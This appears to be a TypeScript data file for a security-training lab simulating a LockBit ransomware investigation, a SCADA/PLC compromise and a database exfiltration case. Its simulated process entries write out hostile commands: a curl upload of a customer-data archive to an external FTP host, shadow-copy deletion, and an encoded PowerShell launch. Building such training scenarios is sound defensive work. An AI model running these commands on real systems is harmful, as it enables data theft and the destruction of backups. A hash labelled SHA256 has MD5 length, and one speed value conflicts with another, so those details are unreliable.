// ─── Core types ───────────────────────────────────────────────────────────────

export type LabMode = "it_soc" | "ot_scada" | "forensic" | "network";
export type TerminalType = "bash" | "powershell" | "modbus_cli" | "plc";
export type LogLevel = "INFO" | "WARNING" | "ERROR" | "CRITICAL" | "DEBUG";
export type IOCType = "ip" | "hash" | "domain" | "process" | "registry" | "filename" | "user";
export type ScenarioPhase = "normal" | "initial_compromise" | "lateral_movement" | "exfiltration" | "impact" | "recovery";

export interface LabCommand {
  cmd: string;                    // exact command typed
  aliases?: string[];             // alternative forms
  description: string;
  category: "network" | "process" | "filesystem" | "auth" | "ot" | "forensic" | "mitigation";
  outputFn: (args: string[], ctx: LabContext) => CommandOutput;
  requiresArgs?: boolean;
  hint?: string;                  // shown in autocomplete
}

export interface CommandOutput {
  lines: OutputLine[];
  isError?: boolean;
  triggersEvent?: LabEvent;      // fires a lab event if this command is run
  revealIOC?: string[];          // IOC IDs revealed by this command
  scorePoints?: number;
}

export interface OutputLine {
  text: string;
  color?: "white" | "green" | "red" | "yellow" | "cyan" | "gray" | "orange";
  bold?: boolean;
}

export interface LabContext {
  phase: ScenarioPhase;
  discoveredIOCs: string[];       // IOC IDs already found
  executedCommands: string[];
  mode: LabMode;
  scenarioData: ScenarioData;
}

export interface IOCDefinition {
  id: string;
  type: IOCType;
  value: string;
  description: string;
  severity: "low" | "medium" | "high" | "critical";
  revealedBy: string[];          // which commands reveal this IOC
  linkedToPhase: ScenarioPhase;
}

export interface LabEvent {
  type: "ioc_found" | "action_taken" | "system_isolated" | "threat_contained" | "escalation";
  description: string;
  participantId?: string;
  metadata?: Record<string, unknown>;
}

export interface ScenarioData {
  id: string;
  title: string;
  mode: LabMode;
  phase: ScenarioPhase;
  iocs: IOCDefinition[];
  // IT/SOC context
  hosts?: HostData[];
  processes?: ProcessData[];
  networkConnections?: NetworkConn[];
  logEntries?: LogEntry[];
  // OT context
  plcDevices?: PLCDevice[];
  scadaTags?: ScadaTag[];
  otEvents?: OTEvent[];
}

export interface HostData {
  ip: string;
  hostname: string;
  os: string;
  openPorts: number[];
  services: string[];
  isCompromised: boolean;
  lastSeen: string;
  riskLevel: "none" | "low" | "medium" | "high" | "critical";
}

export interface ProcessData {
  pid: number;
  name: string;
  user: string;
  cpu: number;
  mem: number;
  cmdline: string;
  parentPid: number;
  isMalicious: boolean;
  startTime: string;
}

export interface NetworkConn {
  localAddr: string;
  localPort: number;
  remoteAddr: string;
  remotePort: number;
  state: string;
  pid: number;
  process: string;
  isSuspicious: boolean;
}

export interface LogEntry {
  timestamp: string;
  level: LogLevel;
  source: string;
  eventId?: number;
  user?: string;
  host?: string;
  message: string;
  isIOC: boolean;
  iocId?: string;
}

export interface PLCDevice {
  id: string;
  name: string;
  ip: string;
  type: string;            // "Siemens S7-300", "Allen-Bradley", "Schneider M340"
  status: "online" | "offline" | "fault" | "warning" | "compromised";
  registers: PLCRegister[];
  lastUpdate: string;
}

export interface PLCRegister {
  address: number;
  name: string;
  value: number;
  unit: string;
  min: number;
  max: number;
  isAnomaly: boolean;
  expectedValue?: number;
}

export interface ScadaTag {
  id: string;
  name: string;
  description: string;
  value: number;
  unit: string;
  status: "normal" | "warning" | "alarm" | "offline";
  min: number;
  max: number;
  setpoint: number;
  trend: number[];           // last 10 values
}

export interface OTEvent {
  timestamp: string;
  severity: "info" | "warning" | "alarm" | "critical";
  source: string;
  message: string;
  isAnomaly: boolean;
}

// ─── Built-in scenarios ───────────────────────────────────────────────────────

export const CYBERLAB_SCENARIOS: Record<string, ScenarioData> = {

  // ══════════════════════════════════════════════════════════
  // IT/SOC — Ransomware LockBit
  // ══════════════════════════════════════════════════════════
  ransomware_soc: {
    id: "ransomware_soc",
    title: "Ransomware LockBit — Investigation SOC",
    mode: "it_soc",
    phase: "impact",
    iocs: [
      { id: "ioc-01", type: "ip", value: "185.220.101.47", description: "C2 LockBit connu (Shodan: Tor exit node)", severity: "critical", revealedBy: ["netstat -an", "ss -tulpn", "netstat -tunp"], linkedToPhase: "lateral_movement" },
      { id: "ioc-02", type: "hash", value: "a3f2c4e8d1b7f3a9c2d5e8f1b4a7d2e5", description: "Hash SHA256 du dropper LockBit 3.0 (VirusTotal: 67/72)", severity: "critical", revealedBy: ["find / -name '*.exe'", "md5sum", "sha256sum", "ls -la /tmp"], linkedToPhase: "initial_compromise" },
      { id: "ioc-03", type: "process", value: "svc_update.exe", description: "Processus dropper — PID 4821, masqué en mise à jour Windows", severity: "critical", revealedBy: ["ps aux", "ps -ef", "Get-Process", "tasklist"], linkedToPhase: "initial_compromise" },
      { id: "ioc-04", type: "user", value: "svc_backup", description: "Compte de service compromis — dernier login depuis IP externe suspecte", severity: "high", revealedBy: ["last", "lastlog", "Get-EventLog", "grep 'svc_backup' /var/log/auth.log"], linkedToPhase: "lateral_movement" },
      { id: "ioc-05", type: "domain", value: "update-ms-cdn.com", description: "Domaine C2 — résolution DNS détectée, enregistré il y a 3 jours", severity: "high", revealedBy: ["nslookup", "dig", "cat /etc/resolv.conf", "Get-DnsClientCache"], linkedToPhase: "exfiltration" },
      { id: "ioc-06", type: "registry", value: "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinUpdate", description: "Clé de persistance ajoutée par le malware", severity: "high", revealedBy: ["Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "reg query"], linkedToPhase: "initial_compromise" },
      { id: "ioc-07", type: "filename", value: "!!!READ_ME_LOCKBIT!!!.txt", description: "Note de rançon déposée dans C:\\Users\\Public\\", severity: "critical", revealedBy: ["find / -name '*.txt' -newer", "dir C:\\Users\\Public", "ls /tmp"], linkedToPhase: "impact" },
    ],
    hosts: [
      { ip: "192.168.1.10", hostname: "SRV-FILES-01", os: "Windows Server 2019", openPorts: [445, 3389, 135, 139], services: ["SMB", "RDP", "WMI"], isCompromised: true, lastSeen: "2024-11-18 09:47:23", riskLevel: "critical" },
      { ip: "192.168.1.11", hostname: "SRV-FILES-02", os: "Windows Server 2019", openPorts: [445, 135, 139], services: ["SMB", "WMI"], isCompromised: true, lastSeen: "2024-11-18 09:52:11", riskLevel: "critical" },
      { ip: "192.168.1.20", hostname: "SRV-ERP-PROD", os: "Windows Server 2016", openPorts: [1433, 445, 8080], services: ["MSSQL", "SMB", "HTTP"], isCompromised: true, lastSeen: "2024-11-18 09:55:02", riskLevel: "critical" },
      { ip: "192.168.1.50", hostname: "DC-01", os: "Windows Server 2022", openPorts: [389, 445, 88, 53, 636], services: ["LDAP", "Kerberos", "DNS", "SMB"], isCompromised: false, lastSeen: "2024-11-18 10:02:45", riskLevel: "high" },
      { ip: "192.168.1.100", hostname: "WKS-FINANCE-01", os: "Windows 11 Pro", openPorts: [3389, 445], services: ["RDP", "SMB"], isCompromised: true, lastSeen: "2024-11-18 09:41:07", riskLevel: "critical" },
      { ip: "192.168.1.200", hostname: "MONITORING-01", os: "Ubuntu 22.04 LTS", openPorts: [22, 9090, 3000], services: ["SSH", "Prometheus", "Grafana"], isCompromised: false, lastSeen: "2024-11-18 10:05:12", riskLevel: "low" },
    ],
    processes: [
      { pid: 4821, name: "svc_update.exe", user: "svc_backup", cpu: 87.3, mem: 234.5, cmdline: "svc_update.exe -encrypt -silent -ransom 2.3", parentPid: 1, isMalicious: true, startTime: "09:41:07" },
      { pid: 4822, name: "vssadmin.exe", user: "svc_backup", cpu: 2.1, mem: 8.2, cmdline: "vssadmin delete shadows /all /quiet", parentPid: 4821, isMalicious: true, startTime: "09:41:09" },
      { pid: 3219, name: "explorer.exe", user: "SYSTEM", cpu: 0.3, mem: 45.2, cmdline: "C:\\Windows\\explorer.exe", parentPid: 2, isMalicious: false, startTime: "08:12:43" },
      { pid: 1204, name: "mssqlserver.exe", user: "sa", cpu: 12.4, mem: 892.1, cmdline: "C:\\Program Files\\Microsoft SQL Server\\mssqlserver.exe", parentPid: 1, isMalicious: false, startTime: "07:00:01" },
      { pid: 5001, name: "powershell.exe", user: "svc_backup", cpu: 15.7, mem: 67.3, cmdline: "powershell.exe -enc JABjAGwAaQBlAG4AdA...", parentPid: 4821, isMalicious: true, startTime: "09:43:22" },
    ],
    networkConnections: [
      { localAddr: "192.168.1.100", localPort: 49782, remoteAddr: "185.220.101.47", remotePort: 443, state: "ESTABLISHED", pid: 4821, process: "svc_update.exe", isSuspicious: true },
      { localAddr: "192.168.1.10", localPort: 49901, remoteAddr: "185.220.101.47", remotePort: 443, state: "ESTABLISHED", pid: 4821, process: "svc_update.exe", isSuspicious: true },
      { localAddr: "192.168.1.20", localPort: 1433, remoteAddr: "192.168.1.100", remotePort: 51203, state: "ESTABLISHED", pid: 1204, process: "mssqlserver.exe", isSuspicious: false },
    ],
    logEntries: [
      { timestamp: "2024-11-18 02:17:43", level: "WARNING", source: "VPN Gateway", eventId: 0, user: "svc_backup", host: "REMOTE", message: "Authentication from external IP 94.102.49.190 — unusual location (Netherlands)", isIOC: true, iocId: "ioc-04" },
      { timestamp: "2024-11-18 02:18:01", level: "INFO", source: "Active Directory", eventId: 4624, user: "svc_backup", host: "WKS-FINANCE-01", message: "Logon Type 3 (Network) — successful authentication", isIOC: false },
      { timestamp: "2024-11-18 02:31:55", level: "ERROR", source: "EDR", eventId: 0, user: "svc_backup", host: "WKS-FINANCE-01", message: "Suspicious process spawned: powershell.exe -enc [base64 payload]", isIOC: true, iocId: "ioc-03" },
      { timestamp: "2024-11-18 02:32:17", level: "CRITICAL", source: "EDR", eventId: 0, user: "svc_backup", host: "WKS-FINANCE-01", message: "MALWARE DETECTED: LockBit 3.0 dropper — SHA256: a3f2c4e8d1b7f3a9c2d5e8f1b4a7d2e5", isIOC: true, iocId: "ioc-02" },
      { timestamp: "2024-11-18 02:45:12", level: "CRITICAL", source: "Windows Security", eventId: 7045, user: "SYSTEM", host: "SRV-FILES-01", message: "New service installed: 'WinUpdate' — ImagePath: C:\\Windows\\Temp\\svc_update.exe", isIOC: true, iocId: "ioc-06" },
      { timestamp: "2024-11-18 09:41:07", level: "CRITICAL", source: "File Monitoring", eventId: 0, user: "svc_backup", host: "SRV-FILES-01", message: "Mass file encryption started — 847 files/min — extension .locked", isIOC: false },
      { timestamp: "2024-11-18 09:43:19", level: "CRITICAL", source: "DNS", eventId: 0, user: "", host: "SRV-FILES-01", message: "DNS query: update-ms-cdn.com → 185.220.101.47 (known C2 infrastructure)", isIOC: true, iocId: "ioc-05" },
      { timestamp: "2024-11-18 09:47:23", level: "CRITICAL", source: "VSS", eventId: 0, user: "svc_backup", host: "SRV-FILES-01", message: "Volume Shadow Copy deletion: vssadmin delete shadows /all /quiet", isIOC: false },
    ],
  },

  // ══════════════════════════════════════════════════════════
  // OT/SCADA — Compromission automates industriels
  // ══════════════════════════════════════════════════════════
  ot_scada_attack: {
    id: "ot_scada_attack",
    title: "Compromission SCADA — Usine de Production",
    mode: "ot_scada",
    phase: "impact",
    iocs: [
      { id: "ot-ioc-01", type: "ip", value: "10.0.10.47", description: "IP inconnue sur réseau OT — non répertoriée, trafic Modbus anormal", severity: "critical", revealedBy: ["modbus read", "plc status", "ot-scan", "netstat"], linkedToPhase: "initial_compromise" },
      { id: "ot-ioc-02", type: "process", value: "ModbusPoller.exe", description: "Process non autorisé interrogeant les PLCs à haute fréquence", severity: "high", revealedBy: ["ps aux", "plc audit-log", "process-list"], linkedToPhase: "lateral_movement" },
      { id: "ot-ioc-03", type: "registry", value: "PLC-CHAINE-B:HR[40001]", description: "Registre vitesse convoyeur modifié — valeur anormale 2847 tr/min (max autorisé: 1500)", severity: "critical", revealedBy: ["modbus read 1 40001", "plc read PLC-CHAINE-B HR 40001", "plc status PLC-CHAINE-B"], linkedToPhase: "impact" },
      { id: "ot-ioc-04", type: "user", value: "maint_ext_003", description: "Compte maintenance externe actif hors plage horaire autorisée (03h17)", severity: "high", revealedBy: ["ot-auditlog", "last", "plc audit-log", "who"], linkedToPhase: "initial_compromise" },
    ],
    plcDevices: [
      { id: "PLC-CHAINE-A", name: "Automate Chaîne A", ip: "10.0.10.10", type: "Siemens S7-300", status: "online", lastUpdate: "10:05:12",
        registers: [
          { address: 40001, name: "Vitesse convoyeur", value: 1200, unit: "tr/min", min: 0, max: 1500, isAnomaly: false },
          { address: 40002, name: "Température moteur", value: 68, unit: "°C", min: 0, max: 90, isAnomaly: false },
          { address: 40003, name: "Pression hydraulique", value: 8.2, unit: "bar", min: 5, max: 12, isAnomaly: false },
          { address: 40004, name: "Position bras robot", value: 145, unit: "°", min: 0, max: 360, isAnomaly: false },
        ]
      },
      { id: "PLC-CHAINE-B", name: "Automate Chaîne B", ip: "10.0.10.11", type: "Siemens S7-300", status: "warning", lastUpdate: "10:03:47",
        registers: [
          { address: 40001, name: "Vitesse convoyeur", value: 2847, unit: "tr/min", min: 0, max: 1500, isAnomaly: true, expectedValue: 1200 },
          { address: 40002, name: "Température moteur", value: 94, unit: "°C", min: 0, max: 90, isAnomaly: true, expectedValue: 68 },
          { address: 40003, name: "Pression hydraulique", value: 4.1, unit: "bar", min: 5, max: 12, isAnomaly: true, expectedValue: 8.2 },
          { address: 40004, name: "Position bras robot", value: 0, unit: "°", min: 0, max: 360, isAnomaly: false },
        ]
      },
      { id: "PLC-UTILS", name: "Automate Utilités", ip: "10.0.10.12", type: "Allen-Bradley L71", status: "online", lastUpdate: "10:05:08",
        registers: [
          { address: 40001, name: "Débit eau refroidissement", value: 42.3, unit: "L/min", min: 30, max: 80, isAnomaly: false },
          { address: 40002, name: "Pression air comprimé", value: 7.8, unit: "bar", min: 6, max: 9, isAnomaly: false },
        ]
      },
      { id: "PLC-CHAINE-C", name: "Automate Chaîne C", ip: "10.0.10.13", type: "Schneider M340", status: "fault", lastUpdate: "09:58:22",
        registers: [
          { address: 40001, name: "Vitesse convoyeur", value: 0, unit: "tr/min", min: 0, max: 1500, isAnomaly: true, expectedValue: 1200 },
          { address: 40002, name: "État sécurité", value: 0, unit: "bool", min: 0, max: 1, isAnomaly: true, expectedValue: 1 },
        ]
      },
    ],
    scadaTags: [
      { id: "T001", name: "PROD_CHAINE_A_VITESSE", description: "Vitesse convoyeur chaîne A", value: 1200, unit: "tr/min", status: "normal", min: 0, max: 1500, setpoint: 1200, trend: [1200,1195,1200,1202,1198,1200,1200,1201,1199,1200] },
      { id: "T002", name: "PROD_CHAINE_B_VITESSE", description: "Vitesse convoyeur chaîne B", value: 2847, unit: "tr/min", status: "alarm", min: 0, max: 1500, setpoint: 1200, trend: [1200,1350,1600,1900,2200,2500,2700,2800,2830,2847] },
      { id: "T003", name: "TEMP_MOTEUR_B", description: "Température moteur chaîne B", value: 94, unit: "°C", status: "alarm", min: 0, max: 90, setpoint: 65, trend: [65,68,72,76,81,86,89,92,93,94] },
      { id: "T004", name: "PRESSION_HYD_B", description: "Pression hydraulique chaîne B", value: 4.1, unit: "bar", status: "warning", min: 5, max: 12, setpoint: 8, trend: [8.0,7.5,6.8,6.1,5.5,4.9,4.5,4.3,4.2,4.1] },
      { id: "T005", name: "PROD_CHAINE_C_STATE", description: "État chaîne C", value: 0, unit: "bool", status: "alarm", min: 0, max: 1, setpoint: 1, trend: [1,1,1,1,1,1,0,0,0,0] },
    ],
    otEvents: [
      { timestamp: "03:17:41", severity: "warning", source: "OT Firewall", message: "Connexion Modbus TCP depuis IP non autorisée 10.0.10.47 vers PLC-CHAINE-B", isAnomaly: true },
      { timestamp: "03:18:02", severity: "info", source: "HMI", message: "Paramètre vitesse convoyeur B modifié par station maint_ext_003", isAnomaly: true },
      { timestamp: "09:41:05", severity: "alarm", source: "PLC-CHAINE-B", message: "ALARME PROCESS — Vitesse convoyeur hors limites : 1847 tr/min (max: 1500)", isAnomaly: true },
      { timestamp: "09:52:17", severity: "critical", source: "Sécurité machine", message: "ARRÊT SÉCURITÉ — Protection thermique moteur B déclenchée (T° > 90°C)", isAnomaly: true },
      { timestamp: "09:58:22", severity: "critical", source: "PLC-CHAINE-C", message: "Défaut communication — PLC Chaîne C ne répond plus (watchdog timeout)", isAnomaly: true },
    ],
    logEntries: [],
  },

  // ══════════════════════════════════════════════════════════
  // FORENSIC — Investigation post-incident
  // ══════════════════════════════════════════════════════════
  forensic_investigation: {
    id: "forensic_investigation",
    title: "Investigation Forensique — Compromission Data",
    mode: "forensic",
    phase: "exfiltration",
    iocs: [
      { id: "f-ioc-01", type: "ip", value: "45.147.229.85", description: "IP de destination exfiltration — hébergeur bulletproof Russie", severity: "critical", revealedBy: ["tcpdump", "wireshark", "netstat -an", "ss -tulpn"], linkedToPhase: "exfiltration" },
      { id: "f-ioc-02", type: "hash", value: "b8e2f1a4c9d3e7f2b5a8d1c4e7f3a9b2", description: "Hash du stealer — credential harvester", severity: "critical", revealedBy: ["find / -newer /tmp -type f", "md5sum *", "sha256sum *"], linkedToPhase: "initial_compromise" },
      { id: "f-ioc-03", type: "filename", value: "data_export_2024.7z", description: "Archive chiffrée — 47 GB exfiltrée vers serveur externe", severity: "critical", revealedBy: ["find / -name '*.7z'", "ls -la /tmp", "find / -size +1G"], linkedToPhase: "exfiltration" },
      { id: "f-ioc-04", type: "user", value: "dbadmin_temp", description: "Compte temporaire créé nuitamment — non autorisé, droits admin DB", severity: "high", revealedBy: ["cat /etc/passwd", "getent passwd", "last", "grep dbadmin /var/log/auth.log"], linkedToPhase: "lateral_movement" },
    ],
    hosts: [
      { ip: "10.0.1.15", hostname: "DB-SERVER-01", os: "Red Hat Enterprise Linux 8", openPorts: [22, 5432, 8080], services: ["SSH", "PostgreSQL", "Tomcat"], isCompromised: true, lastSeen: "2024-11-18 04:33:12", riskLevel: "critical" },
    ],
    processes: [
      { pid: 3847, name: "psql", user: "dbadmin_temp", cpu: 45.2, mem: 512.0, cmdline: "psql -h localhost -U dbadmin_temp -c 'SELECT * FROM customers LIMIT 500000'", parentPid: 3846, isMalicious: true, startTime: "03:42:17" },
      { pid: 3849, name: "7z", user: "dbadmin_temp", cpu: 78.3, mem: 256.0, cmdline: "7z a -p'P@ssw0rd2024!' /tmp/data_export_2024.7z /tmp/dump_*.csv", parentPid: 3847, isMalicious: true, startTime: "03:51:43" },
      { pid: 3851, name: "curl", user: "dbadmin_temp", cpu: 12.1, mem: 8.4, cmdline: "curl -T /tmp/data_export_2024.7z ftp://45.147.229.85/upload/", parentPid: 3849, isMalicious: true, startTime: "04:02:19" },
    ],
    networkConnections: [
      { localAddr: "10.0.1.15", localPort: 52341, remoteAddr: "45.147.229.85", remotePort: 21, state: "ESTABLISHED", pid: 3851, process: "curl", isSuspicious: true },
    ],
    logEntries: [
      { timestamp: "2024-11-18 01:44:23", level: "WARNING", source: "SSH", eventId: 0, user: "root", host: "DB-SERVER-01", message: "SSH brute-force detected: 847 failed attempts from 185.220.101.33 in 120s", isIOC: false },
      { timestamp: "2024-11-18 01:52:01", level: "CRITICAL", source: "SSH", eventId: 0, user: "root", host: "DB-SERVER-01", message: "Successful root login from 185.220.101.33 — key-based auth", isIOC: false },
      { timestamp: "2024-11-18 01:55:12", level: "WARNING", source: "auth", eventId: 0, user: "root", host: "DB-SERVER-01", message: "useradd: new user dbadmin_temp added to sudoers", isIOC: true, iocId: "f-ioc-04" },
      { timestamp: "2024-11-18 03:42:17", level: "CRITICAL", source: "PostgreSQL", eventId: 0, user: "dbadmin_temp", host: "DB-SERVER-01", message: "QUERY STARTED: SELECT * FROM customers (500,000 rows) — full table scan", isIOC: false },
      { timestamp: "2024-11-18 04:02:19", level: "CRITICAL", source: "Network", eventId: 0, user: "dbadmin_temp", host: "DB-SERVER-01", message: "Large outbound transfer initiated: 47.3 GB → 45.147.229.85:21 (FTP)", isIOC: true, iocId: "f-ioc-01" },
    ],
  },
};

// ─── Terminal command helpers ──────────────────────────────────────────────────

export function formatTable(headers: string[], rows: string[][]): OutputLine[] {
  const colWidths = headers.map((h, i) =>
    Math.max(h.length, ...rows.map(r => (r[i] || "").length))
  );
  const lines: OutputLine[] = [];
  const header = headers.map((h, i) => h.padEnd(colWidths[i])).join("  ");
  const separator = colWidths.map(w => "─".repeat(w)).join("  ");
  lines.push({ text: header, color: "cyan", bold: true });
  lines.push({ text: separator, color: "gray" });
  rows.forEach(row => {
    lines.push({ text: row.map((c, i) => (c || "").padEnd(colWidths[i])).join("  "), color: "white" });
  });
  return lines;
}

export function ts(offset = 0): string {
  const d = new Date(Date.now() - offset * 1000);
  return d.toTimeString().split(" ")[0];
}
